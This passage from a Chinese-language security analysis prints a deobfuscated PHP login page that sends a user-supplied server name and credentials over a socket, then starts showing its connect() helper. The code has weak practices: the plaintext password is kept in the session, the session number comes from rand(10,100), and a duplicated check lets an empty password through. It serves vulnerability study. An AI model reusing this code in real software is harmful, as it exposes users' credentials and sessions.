<p>看到这里，我们认为，这种base64混淆技术不如<a href="http://www.ioncube.com/" rel="nofollow">ionCube</a>或<a href="http://www.zend.com/en/products/zend-guard" rel="nofollow">Zend Guard</a>的JIT混淆技术好。破解了base64加密机制后，我们发现了以下代码：</p>
<p><span style="color: rgb(32, 96, 160); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(32, 96, 160); font-size: 13px;">&lt;?php</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span></p><p><span style="color: rgb(0, 128, 128); font-size: 13px;">session_start</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&amp;&amp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//header("location: data.php" );</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//exit();</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(32, 96, 160); font-size: 13px;">?&gt;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;"><span style="color: rgb(32, 96, 160); font-size: 13px;">&lt;?php</span>&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">include_once</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"config.php"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span>&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">?&gt;</span><br /></span><span style="color: rgb(32, 96, 160); font-size: 13px;">&lt;?php</span></p><p><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">''</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;"><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"submit"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$servername</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"servername"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span>?<span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_real_escape_string</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"servername"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span>?<span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_real_escape_string</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"password"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span>?<span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_real_escape_string</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_POST</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"password"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$servername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"Please Enter Server Name"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">elseif</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"Please Enter Username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//elseif (strpos($username,'@')==false) {</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//&nbsp; $error= 'Please Enter Valid Username';</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">elseif</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"Please Enter Password"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1056</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>connect&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$servername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"socket"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">601</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//authenticate login</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendtags</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"socket"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span>sendstringtoserver<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"socket"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span>sendstringtoserver<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"socket"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$recv</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;getstringfromserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"socket"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$recv</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'_SUCCESS_'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"username"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"ip"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$servername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"password"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"sessionno"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 128); font-size: 13px;">rand</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 160); font-size: 13px;">10</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 128, 160); font-size: 13px;">100</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">session_write_close</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">header</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"location: reports"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">exit</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>仔细查看，其中包含config.php，其功能的第31行是用户连接服务端所需要输入的端口号和服务名称函数connect()。现在我们来看看其在config.php中的具体功能：</p>
<p><span style="color: rgb(32, 96, 160); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(32, 96, 160); font-size: 13px;">function</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;connect&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ip</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!</span><span style="color: rgb(0, 128, 128); font-size: 13px;">extension_loaded</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'sockets'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">die</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'The sockets extension is not loaded.'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">socket_create</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span>AF_INET<span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;SOCK_STREAM<span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$errorcode</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span 